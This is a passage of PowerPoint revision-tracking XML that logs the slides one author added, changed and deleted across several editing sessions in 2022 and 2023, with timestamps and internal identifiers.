          <pc:sldMk cId="1464641979" sldId="300"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T05:59:09.182" v="992" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3476855435" sldId="301"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T05:59:43.800" v="1023" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="894525879" sldId="302"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:08:46.268" v="1105"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="637227487" sldId="303"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:08:52.067" v="1106"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2001640094" sldId="304"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:08:59.418" v="1108" actId="27636"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3311874055" sldId="305"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:09:03.308" v="1109"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="113792955" sldId="306"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:09:11.459" v="1110"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4273026588" sldId="307"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T15:21:14.797" v="1987" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="583477465" sldId="308"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:14:35.200" v="1136" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3018376454" sldId="309"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:48:40.994" v="1524" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4049484546" sldId="310"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:45:59.336" v="1522" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="805640535" sldId="311"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:48:38.860" v="1523"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="646219748" sldId="312"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-25T14:26:30.642" v="2411" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="753231097" sldId="313"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T06:50:04.954" v="1526"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2437146036" sldId="313"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-02T07:41:18.618" v="1651" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4203510878" sldId="314"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-12T20:12:14.777" v="2150" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="827427953" sldId="315"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-05T19:47:48.398" v="2099" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="49326280" sldId="316"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-05T19:48:27.409" v="2118" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3552784406" sldId="317"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-05T19:47:45.254" v="2098"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3181760124" sldId="318"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-05T19:47:45.254" v="2098"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="451996062" sldId="319"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-27T14:49:26.126" v="2414" actId="5793"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3843718708" sldId="320"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-12T20:10:32.510" v="2137" actId="478"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3600052845" sldId="321"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp add del mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{7B07D691-3692-499E-8247-EE4588653D58}" dt="2022-10-24T07:32:03.181" v="2273" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1587109924" sldId="322"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A1143D61-EF04-4489-B786-2AA3A943072C}"/>
    <pc:docChg chg="custSel modSld">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A1143D61-EF04-4489-B786-2AA3A943072C}" dt="2022-09-11T07:17:14.051" v="52" actId="20577"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A1143D61-EF04-4489-B786-2AA3A943072C}" dt="2022-09-11T07:15:43.420" v="7" actId="27636"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4085468298" sldId="259"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{A1143D61-EF04-4489-B786-2AA3A943072C}" dt="2022-09-11T07:17:14.051" v="52" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3375276284" sldId="260"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{650192AF-9553-4EFB-AFAB-D69A07724EEF}"/>
    <pc:docChg chg="undo custSel addSld delSld modSld">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{650192AF-9553-4EFB-AFAB-D69A07724EEF}" dt="2022-07-29T18:38:38.724" v="107" actId="20577"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{650192AF-9553-4EFB-AFAB-D69A07724EEF}" dt="2022-07-29T18:38:38.724" v="107" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1942183190" sldId="256"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="new del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{650192AF-9553-4EFB-AFAB-D69A07724EEF}" dt="2022-07-29T15:16:09.945" v="83" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3856697465" sldId="263"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="addSp delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{650192AF-9553-4EFB-AFAB-D69A07724EEF}" dt="2022-07-29T15:15:49.248" v="82" actId="14100"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="464114118" sldId="264"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp modSp add mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{650192AF-9553-4EFB-AFAB-D69A07724EEF}" dt="2022-07-29T15:14:57.903" v="67" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4200366489" sldId="265"/>
        </pc:sldMkLst>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}"/>
    <pc:docChg chg="undo custSel addSld delSld modSld">
      <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:28.253" v="43" actId="47"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:02.826" v="11" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1942183190" sldId="256"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:08.724" v="12" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3044182988" sldId="257"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:25.423" v="13" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2053424092" sldId="262"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:08.724" v="12" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="492019113" sldId="274"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:08.724" v="12" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1487464807" sldId="275"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:08.724" v="12" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4207688934" sldId="281"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:25.423" v="13" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="796518760" sldId="287"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:12.574" v="40" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1217379116" sldId="288"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:22.760" v="41" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1494541756" sldId="289"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:25.423" v="13" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3609321729" sldId="290"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:25.423" v="13" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2760488417" sldId="291"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:25.423" v="13" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1850839270" sldId="292"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:29.147" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="396725004" sldId="293"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:29.147" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1655275264" sldId="294"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:29.147" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2401027557" sldId="295"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:29.147" v="14" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="78872398" sldId="296"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:39.157" v="15" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3104846191" sldId="297"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:02.769" v="26" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="286046674" sldId="298"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:40.976" v="16" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2214270807" sldId="299"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:01.353" v="23" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1464641979" sldId="300"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:02.096" v="24" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3476855435" sldId="301"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:02.472" v="25" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="894525879" sldId="302"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:03.379" v="28" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="637227487" sldId="303"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:04.956" v="33" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2001640094" sldId="304"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:05.211" v="34" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3311874055" sldId="305"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:05.520" v="35" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="113792955" sldId="306"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:06.162" v="36" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4273026588" sldId="307"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:28.253" v="43" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="583477465" sldId="308"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:03.032" v="27" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3018376454" sldId="309"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:04.493" v="31" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="805640535" sldId="311"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:03.990" v="30" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="646219748" sldId="312"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:04.725" v="32" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="753231097" sldId="313"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:16:03.777" v="29" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4203510878" sldId="314"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:44.690" v="17" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="827427953" sldId="315"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:51.332" v="19" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3552784406" sldId="317"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:54.584" v="20" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3181760124" sldId="318"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
        <pc:chgData name="Josep Maria Herrera Marimon" userId="ec91813b-a46b-450e-90f5-79432b30d154" providerId="ADAL" clId="{AE4944AB-48C7-4701-BE45-74CF79279177}" dt="2023-06-09T07:15:55.417" v="21" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="451996062" sldId="319"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="del">
